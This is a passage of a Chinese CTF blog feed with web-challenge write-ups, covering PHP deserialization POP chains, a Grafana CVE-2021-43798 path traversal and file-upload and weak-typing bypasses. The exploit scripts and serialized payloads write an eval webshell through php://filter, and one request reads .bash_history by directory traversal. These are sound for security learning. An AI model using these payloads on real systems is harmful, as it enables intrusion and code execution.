class="hljs-string">&quot;php://filter/write=string.strip_tags|convert.base64-decode/resource=flag.php&quot;</span>,<span class="hljs-string">&quot;PD9waHAgZXZhbCgkX0dFVFswXSk7Pz4=&quot;</span>);<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$text</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span>=<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$text</span>=<span class="hljs-string">&#x27;&#x27;</span></span>)</span>&#123;<br>    <span class="hljs-variable language_">$this</span>-&gt;file=<span class="hljs-variable">$file</span>;<br>    <span class="hljs-variable language_">$this</span>-&gt;text=<span class="hljs-variable">$text</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-variable">$aa</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">A</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$aa</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-regexp">/surprise/</span><span class="hljs-keyword">source</span>.php?cmd=O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;A&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;hello&quot;</span>;O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;B&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;file&quot;</span>;s:<span class="hljs-number">76</span>:<span class="hljs-string">&quot;php://filter/write=string.strip_tags|convert.base64-decode/resource=evil.php&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;text&quot;</span>;s:<span class="hljs-number">32</span>:<span class="hljs-string">&quot;PD9waHAgZXZhbCgkX0dFVFswXSk7Pz4=&quot;</span>;&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101721515.png" alt="image-20221209110838644"></p><h2 id="POP"><a href="#POP" class="headerlink" title="POP"></a>POP</h2><p>依旧是死亡之exit的绕过，两题考点差不多</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">catf1ag1</span></span>&#123; <br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$hzy</span>; <br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$arr</span>; <br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show</span>(<span class="hljs-params"></span>)</span>&#123; <br>        <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>); <br>    &#125; <br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123; <br>        <span class="hljs-keyword">foreach</span>(<span class="hljs-variable language_">$this</span>-&gt;arr <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span> =&gt; <span class="hljs-variable">$v</span>)&#123; <br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;hzy-&gt;<span class="hljs-variable">$v</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;hzy是社么鬼???&quot;</span>;<br>        &#125; <br><br>    &#125; <br>&#125; <br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">catf1ag2</span></span>&#123; <br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$txt</span> = <span class="hljs-string">&#x27;&#x27;</span>; <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123; <br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$key</span> == <span class="hljs-string">&#x27;pputut&#x27;</span>)&#123; <br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">pputut</span>(); <br>        &#125;<span class="hljs-keyword">else</span>&#123; <br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;p&gt;&#x27;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$key</span>).<span class="hljs-string">&#x27;&lt;/p&gt;&#x27;</span>; <br>        &#125; <br>    &#125; <br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">pputut</span>(<span class="hljs-params"></span>)</span>&#123; <br>        <span class="hljs-keyword">if</span>(    <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$this</span>-&gt;file,<span class="hljs-string">&#x27;../&#x27;</span>) !== <span class="hljs-literal">false</span> || <br>            <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$this</span>-&gt;file,<span class="hljs-string">&#x27;\\&#x27;</span>) !== <span class="hljs-literal">false</span>      <br>        ) <span class="hljs-keyword">die</span>(); <br><br>        <span class="hljs-variable">$content</span> = <span class="hljs-string">&#x27;&lt;?php die(\&#x27;stupid\&#x27;); ?&gt;&#x27;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;NICE!!!,来自wsy赠送的小红花&lt;/br&gt;&quot;</span>;<br>        <span class="hljs-variable">$content</span> .= <span class="hljs-variable language_">$this</span>-&gt;txt; <br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$this</span>-&gt;file, <span class="hljs-variable">$content</span>); <br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$content</span>); <br><br>    &#125; <br><br>&#125; <br><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>))&#123; <br>    <span class="hljs-variable">$hzy</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;giao&#x27;</span>]); <br>    <span class="hljs-variable">$instance</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$hzy</span>); <br>&#125;<span class="hljs-keyword">else</span>&#123; <br>    <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">catf1ag1</span>(); <br>    <span class="hljs-variable">$a</span>-&gt;<span class="hljs-title function_ invoke__">show</span>(); <br>&#125;<br></code></pre></td></tr></table></figure><p>exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">catf1ag1</span></span>&#123; <br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$hzy</span>; <br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$arr</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;0&#x27;</span> =&gt; <span class="hljs-string">&#x27;pputut&#x27;</span>); <br><br>    <span class="hljs-comment">// function show()&#123; </span><br>    <span class="hljs-comment">//     show_source(__FILE__); </span><br>    <span class="hljs-comment">// &#125; </span><br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123; <br>        <span class="hljs-keyword">foreach</span>(<span class="hljs-variable language_">$this</span>-&gt;arr <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span> =&gt; <span class="hljs-variable">$v</span>)&#123; <br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;hzy-&gt;<span class="hljs-variable">$v</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;hzy是社么鬼???&quot;</span>;<br>        &#125; <br><br>    &#125; <br>&#125; <br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">catf1ag2</span></span>&#123; <br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$txt</span>; <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123; <br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$key</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$key</span> == <span class="hljs-string">&#x27;pputut&#x27;</span>)&#123; <br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">pputut</span>(); <br>        &#125;<span class="hljs-keyword">else</span>&#123; <br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;p&gt;&#x27;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$key</span>).<span class="hljs-string">&#x27;&lt;/p&gt;&#x27;</span>; <br>        &#125; <br>    &#125; <br><span class="hljs-comment">/*</span><br><span class="hljs-comment">    function pputut()&#123; </span><br><span class="hljs-comment">        if(    strpos($this-&gt;file,&#x27;../&#x27;) !== false || </span><br><span class="hljs-comment">            strpos($this-&gt;file,&#x27;\\&#x27;) !== false      </span><br><span class="hljs-comment">        ) die(); </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">        $content = &#x27;&lt;?php die(\&#x27;stupid\&#x27;); ?&gt;&#x27;;</span><br><span class="hljs-comment">        echo &quot;NICE!!!,来自wsy赠送的小红花&lt;/br&gt;&quot;;</span><br><span class="hljs-comment">        $content .= $this-&gt;txt; </span><br><span class="hljs-comment">        file_put_contents($this-&gt;file, $content); </span><br><span class="hljs-comment">        return htmlspecialchars($content); </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">*/</span><br>&#125; <br><span class="hljs-variable">$cat2</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">catf1ag2</span>();<br><span class="hljs-variable">$cat2</span>-&gt;file=<span class="hljs-string">&quot;php://filter/write=string.strip_tags/convert.base64-decode/resource=shell.php&quot;</span>;<br><span class="hljs-variable">$cat2</span>-&gt;txt=<span class="hljs-string">&quot;PD9waHAgZXZhbCgkX0dFVFswXSk7Pz4=&quot;</span>;<br><br><span class="hljs-variable">$cat</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">catf1ag1</span>();<br><span class="hljs-variable">$cat</span>-&gt;hzy=<span class="hljs-variable">$cat2</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$cat</span>));<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">Tz<span class="hljs-meta">o4</span>OiJjYXRmMWF<span class="hljs-symbol">nMSI6</span>Mjp<span class="hljs-number">7</span>czozOiJoe<span class="hljs-symbol">nkiO086</span>ODoiY<span class="hljs-number">2</span>F<span class="hljs-number">0</span>ZjFhZzIiOjI<span class="hljs-number">6</span>e<span class="hljs-number">3</span><span class="hljs-name">M6</span><span class="hljs-symbol">NDoiZmlsZSI7</span>cz<span class="hljs-meta">o3</span><span class="hljs-symbol">NzoicGhwOi8</span>vZmlsdGVyL<span class="hljs-number">3</span>dyaXRlPX<span class="hljs-symbol">N0</span>cmluZy<span class="hljs-number">5</span>zdHJpcF<span class="hljs-number">90</span>YWdzL<span class="hljs-number">2</span><span class="hljs-symbol">NvbnZlcnQuYmFzZTY0</span>LWRlY<span class="hljs-number">29</span>kZS<span class="hljs-number">9</span>yZX<span class="hljs-symbol">NvdXJjZT1</span>zaG<span class="hljs-attr">VsbC5</span>waHAi<span class="hljs-meta">O3</span><span class="hljs-name">M6</span>MzoidHh<span class="hljs-number">0</span>IjtzOjMyOiJQRDl<span class="hljs-number">3</span>YUhBZ<span class="hljs-number">1</span>pYWmhiQ<span class="hljs-number">2</span>drWDBkRlZGc<span class="hljs-number">3</span>dYU<span class="hljs-number">2</span>s<span class="hljs-number">3</span>UH<span class="hljs-meta">o0</span>PSI<span class="hljs-number">7</span>fX<span class="hljs-name">M6</span>MzoiYXJyIjthOjE<span class="hljs-number">6</span>e<span class="hljs-number">2</span>k<span class="hljs-number">6</span>MDtzOjY<span class="hljs-number">6</span>I<span class="hljs-symbol">nBwdXR1</span>dCI<span class="hljs-number">7</span>fX<span class="hljs-number">0</span>=<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101721516.png" alt="image-20221209114903583"></p><h2 id="history"><a href="#history" class="headerlink" title="history"></a>history</h2><p>题目描述</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">hacker入侵服务器之后没有做好痕迹清理，你能找到hacker的痕迹吗<br></code></pre></td></tr></table></figure><p>通过banner得到grafana版本8.3.0，搜索相关漏洞发现<a href="https://blog.csdn.net/qq_45244158/article/details/121836825">CVE-2021-43798</a>可以利用</p><p>先读取.bash_history（根据题目名字和描述猜测的）</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/public/</span>plugins<span class="hljs-regexp">/cloudwatch/</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>home<span class="hljs-regexp">/grafana/</span>.bash_history<br></code></pre></td></tr></table></figure><p>从中发现flag文件名称和位置（抱歉，没有复现截图）</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/public/</span>plugins<span class="hljs-regexp">/cloudwatch/</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>home<span class="hljs-regexp">/grafana/</span>f1ag<br></code></pre></td></tr></table></figure><p>接着读取flag即可</p><h2 id="fileupload"><a href="#fileupload" class="headerlink" title="fileupload"></a>fileupload</h2><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$text</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;text&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;[&lt;&gt;?]&#x27;</span>, <span class="hljs-variable">$text</span>)) &#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error!&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$text</span>) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$text</span>))<br>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;div&gt;Your f* put content is &quot;</span>.<span class="hljs-variable">$text</span>.<span class="hljs-string">&quot;&lt;/div&gt;&quot;</span>;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&#x27;/tmp/input.php&#x27;</span>, <span class="hljs-variable">$text</span>))&#123;<br><span class="hljs-keyword">include_once</span>(<span class="hljs-string">&quot;include/f1ag_1s_n0t_here.php&quot;</span>);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>f1ag_1s_n0t_here.php可以上传文件</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101721517.png" alt="image-20221210172031076"></p><p>使用php3、php4等后缀可绕过过滤</p><p>后面卡在路径上，上传的小马没法利用，比赛后才知道路径为uploads&#x2F;时间戳_文件名</p>]]></content>
    
    
    <categories>
      
      <category>writeup</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>2022</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2022ISCTF</title>
    <link href="/2022/11/05/2022ISCTF/"/>
    <url>/2022/11/05/2022ISCTF/</url>
    
    <content type="html"><![CDATA[<h1 id="2022ISCTF"><a href="#2022ISCTF" class="headerlink" title="2022ISCTF"></a>2022ISCTF</h1><p>全部Web题解，部分misc</p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="EASY-PHP01"><a href="#EASY-PHP01" class="headerlink" title="EASY-PHP01"></a>EASY-PHP01</h2><p>签到</p><p>弱类型绕过</p><p>114514a</p><h2 id="Fake-web"><a href="#Fake-web" class="headerlink" title="Fake-web"></a>Fake-web</h2><p>打开就是蓝鲨信息的主页</p><p>用curl得到flag</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202211051323622.png" alt="image-20221027120518167"></p><h2 id="EASY-PHP02"><a href="#EASY-PHP02" class="headerlink" title="EASY-PHP02"></a>EASY-PHP02</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;flag&#123;need_time_to_change&#125;&quot;</span>;<br><span class="hljs-keyword">include_once</span>(<span class="hljs-string">&quot;config.php&quot;</span>);<br><span class="hljs-variable">$YOUR_NAME</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;NAME&quot;</span>];<br><span class="hljs-variable">$GET1</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;GET1&quot;</span>];<br><span class="hljs-variable">$GET2</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;GET2&quot;</span>];<br><span class="hljs-variable">$POST1</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;P0ST1&quot;</span>];<br><span class="hljs-variable">$POST2</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;P0ST2&quot;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$YOUR_NAME</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$YOUR_NAME</span>.<span class="hljs-string">&quot;,请开始你的答题。&quot;</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;做题前请告诉我你是小蓝鲨吗？&quot;</span>;<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$POST1</span>))&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;P0ST1&quot;</span>] != <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;P0ST2&quot;</span>])&#123;<br>        <br>        <span class="hljs-keyword">if</span> ((<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;P0ST1&quot;</span>]) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;P0ST2&quot;</span>]))&#123;<br><br>                <span class="hljs-variable">$f1</span>=<span class="hljs-variable">$flag1</span>;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;小蓝鲨成功一半&quot;</span>.<span class="hljs-variable">$f1</span>;              <br>            &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^[0-9]*$/&#x27;</span>,<span class="hljs-variable">$GET1</span>)) &#123;<br><span class="hljs-keyword">exit</span>();<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$GET1</span> == <span class="hljs-number">0</span> )&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>.<span class="hljs-string">&quot;前面的出来了吗？&quot;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$GET2</span>))&#123;<br>            <span class="hljs-keyword">exit</span>();<br>        &#125;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$GET2</span> &gt; <span class="hljs-number">678</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;答案就在眼前？&quot;</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>.<span class="hljs-variable">$YOUR_NAME</span>.<span class="hljs-string">&quot;,你觉得这是flag吗？&quot;</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;     <br>            <span class="hljs-variable">$Ag</span>=<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$flag2</span>);<br>            &#125;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$flag666</span> = <span class="hljs-variable">$f1</span>.<span class="hljs-variable">$Ag</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag666</span>;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">NAME</span>=996&amp;P0ST1=0&amp;P0ST2=240610708<br>GET1= 0&amp;<span class="hljs-attribute">GET2</span>=679a<br></code></pre></td></tr></table></figure><p>结果前半flag为十六进制，后半部分为base64-&gt;unicode</p><h2 id="猫和老鼠"><a href="#猫和老鼠" class="headerlink" title="猫和老鼠"></a>猫和老鼠</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//flag is in flag.php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">mouse</span></span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$v</span>;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Good. You caught the mouse:&quot;</span>;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable language_">$this</span>-&gt;v);<br>      <br>    &#125;<br><br>&#125;<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">cat</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$c</span>;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">dog</span>();<br>        <span class="hljs-variable language_">$this</span>-&gt;b = <span class="hljs-variable language_">$this</span>-&gt;c;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-variable language_">$this</span>-&gt;a);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">dog</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123; <br>        <span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-string">&quot;I&#x27;m a vicious dog, Kitty&quot;</span>;    <br>    &#125;<br>&#125;<br><br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;cat&quot;</span>]); <br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>poc：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 